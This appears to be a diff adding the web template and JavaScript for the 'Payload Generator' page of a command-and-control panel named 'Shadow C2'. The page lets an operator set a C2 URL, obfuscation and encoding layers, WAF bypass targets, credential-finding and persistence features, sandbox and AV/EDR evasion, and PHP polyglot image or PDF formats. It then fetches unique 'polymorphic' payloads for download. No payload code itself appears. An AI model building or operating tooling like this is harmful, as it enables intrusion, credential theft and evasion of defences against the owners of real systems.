@@ -1,0 +1,210 @@
+{% extends "base.html" %}
+{% block title %}Shadow C2 — Payload Generator{% endblock %}
+{% block page_title %}⚙️ Payload Generator{% endblock %}
+
+{% block content %}
+<div class="generator-container">
+    <div class="generator-grid">
+        <!-- Options Panel -->
+        <div class="panel generator-options">
+            <div class="panel-header"><h3>Generation Options</h3></div>
+
+            <div class="form-group">
+                <label>Payload Type</label>
+                <select id="gen-type" class="input-dark">
+                    {% for pt in payload_types %}
+                    <option value="{{ pt.type }}">{{ pt.type }} ({{ pt.ext }})</option>
+                    {% endfor %}
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>C2 URL</label>
+                <input type="text" id="gen-c2url" class="input-dark" value="https://{{ request.host }}">
+            </div>
+
+            <div class="form-group">
+                <label>Encryption Key (auto if empty)</label>
+                <input type="text" id="gen-key" class="input-dark" placeholder="Auto-generated">
+            </div>
+
+            <div class="form-group">
+                <label>Obfuscation Level (1-10)</label>
+                <input type="range" id="gen-obf-level" min="1" max="10" value="5" oninput="document.getElementById('obf-val').textContent=this.value">
+                <span id="obf-val">5</span>
+            </div>
+
+            <div class="form-group">
+                <label>Encoding Layers</label>
+                <div class="checkbox-grid">
+                    {% for enc in encoders %}
+                    <label class="checkbox-label">
+                        <input type="checkbox" value="{{ enc }}" class="enc-check" {% if enc == 'base64' %}checked{% endif %}>
+                        {{ enc }}
+                    </label>
+                    {% endfor %}
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>WAF Bypass Targets</label>
+                <div class="checkbox-grid">
+                    {% for waf in waf_bypasses %}
+                    <label class="checkbox-label">
+                        <input type="checkbox" value="{{ waf }}" class="waf-check">
+                        {{ waf }}
+                    </label>
+                    {% endfor %}
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Features</label>
+                <div class="checkbox-grid">
+                    <label class="checkbox-label"><input type="checkbox" value="exec" class="feat-check" checked> Command Exec</label>
+                    <label class="checkbox-label"><input type="checkbox" value="files" class="feat-check" checked> File Operations</label>
+                    <label class="checkbox-label"><input type="checkbox" value="creds" class="feat-check" checked> Credential Finder</label>
+                    <label class="checkbox-label"><input type="checkbox" value="persist" class="feat-check" checked> Persistence</label>
+                    <label class="checkbox-label"><input type="checkbox" value="selfdestruct" class="feat-check"> Self-Destruct</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Evasion</label>
+                <div class="checkbox-grid">
+                    <label class="checkbox-label"><input type="checkbox" id="gen-sandbox"> Sandbox Detection</label>
+                    <label class="checkbox-label"><input type="checkbox" id="gen-av"> AV/EDR Bypass</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Polyglot Format (optional)</label>
+                <select id="gen-polyglot" class="input-dark">
+                    <option value="">None — raw code</option>
+                    <option value="gif">GIF89a + PHP</option>
+                    <option value="jpg">JPEG + PHP</option>
+                    <option value="png">PNG + PHP</option>
+                    <option value="pdf">PDF + PHP</option>
+                    <option value="svg">SVG + PHP</option>
+                </select>
+            </div>
+
+            <button onclick="generatePayload()" class="btn btn-primary btn-full" id="gen-btn">
+                ⚡ Generate Payload
+            </button>
+        </div>
+
+        <!-- Output Panel -->
+        <div class="panel generator-output">
+            <div class="panel-header">
+                <h3>Generated Payload</h3>
+                <div id="gen-actions" style="display:none;">
+                    <button onclick="downloadPayload()" class="btn btn-sm btn-primary">📥 Download</button>
+                    <button onclick="copyPayload()" class="btn btn-sm btn-secondary">📋 Copy</button>
+                </div>
+            </div>
+
+            <div id="gen-loading" style="display:none;" class="loading-spinner">
+                <div class="spinner"></div>
+                <p>Generating polymorphic payload...</p>
+            </div>
+
+            <div id="gen-result" style="display:none;">
+                <div class="result-meta">
+                    <div class="meta-item"><span class="label">Filename:</span> <span id="res-filename"></span></div>
+                    <div class="meta-item"><span class="label">Size:</span> <span id="res-size"></span></div>
+                    <div class="meta-item"><span class="label">SHA256:</span> <span id="res-hash" class="hash-cell"></span></div>
+                    <div class="meta-item"><span class="label">Type:</span> <span id="res-type"></span></div>
+                </div>
+                <pre class="code-output" id="res-code"></pre>
+            </div>
+
+            <div id="gen-placeholder">
+                <div class="placeholder-content">
+                    <span style="font-size:48px;">🧬</span>
+                    <p>Configure options and click Generate.<br>Every generation produces a unique payload with a different hash.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+let lastPayload = null;
+
+function generatePayload() {
+    const btn = document.getElementById('gen-btn');
+    btn.disabled = true;
+    btn.textContent = '⏳ Generating...';
+
+    document.getElementById('gen-placeholder').style.display = 'none';
+    document.getElementById('gen-result').style.display = 'none';
+    document.getElementById('gen-loading').style.display = 'flex';
+    document.getElementById('gen-actions').style.display = 'none';
+
+    const encoders = [...document.querySelectorAll('.enc-check:checked')].map(e => e.value);
+    const wafs = [...document.querySelectorAll('.waf-check:checked')].map(e => e.value);
+    const features = [...document.querySelectorAll('.feat-check:checked')].map(e => e.value);
+    const polyglot = document.getElementById('gen-polyglot').value;
+
+    const options = {
+        payload_type: document.getElementById('gen-type').value,
+        c2_url: document.getElementById('gen-c2url').value,
+        encryption_key: document.getElementById('gen-key').value,
+        obfuscation_level: parseInt(document.getElementById('gen-obf-level').value),
+        encoding_layers: encoders,
+        waf_targets: wafs,
+        features: features,
+        include_sandbox_detect: document.getElementById('gen-sandbox').checked,
+        include_av_bypass: document.getElementById('gen-av').checked,
+        polyglot_format: polyglot || null,
+    };
+
+    fetch('/dashboard/generate', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(options)
+    })
+    .then(r => r.json())
+    .then(data => {
+        lastPayload = data;
+        document.getElementById('gen-loading').style.display = 'none';
+        document.getElementById('gen-result').style.display = 'block';
+        document.getElementById('gen-actions').style.display = 'flex';
+
+        document.getElementById('res-filename').textContent = data.filename;
+        document.getElementById('res-size').textContent = formatBytes(data.size);
+        document.getElementById('res-hash').textContent = data.sha256;
+        document.getElementById('res-type').textContent = data.content_type;
+        document.getElementById('res-code').textContent = data.content || '[Binary file]';
+
+        btn.disabled = false;
+        btn.textContent = '⚡ Generate Payload';
+        showNotification(`Payload generated: ${data.filename}`);
+    })
+    .catch(err => {
+        document.getElementById('gen-loading').style.display = 'none';
+        document.getElementById('gen-placeholder').style.display = 'flex';
+        btn.disabled = false;
+        btn.textContent = '⚡ Generate Payload';
+        showNotification('Generation failed: ' + err.message);
+    });
+}
+
+function downloadPayload() {
+    if(lastPayload) window.open(`/dashboard/download-payload/${lastPayload.filename}`);
+}
+
+function copyPayload() {
+    const code = document.getElementById('res-code').textContent;
+    navigator.clipboard.writeText(code).then(() => showNotification('Copied to clipboard'));
+}
+
+function formatBytes(b) {
+    if(b < 1024) return b + ' B';
+    if(b < 1048576) return (b/1024).toFixed(1) + ' KB';
+    return (b/1048576).toFixed(1) + ' MB';
+}
+</script>
+{% endblock %}
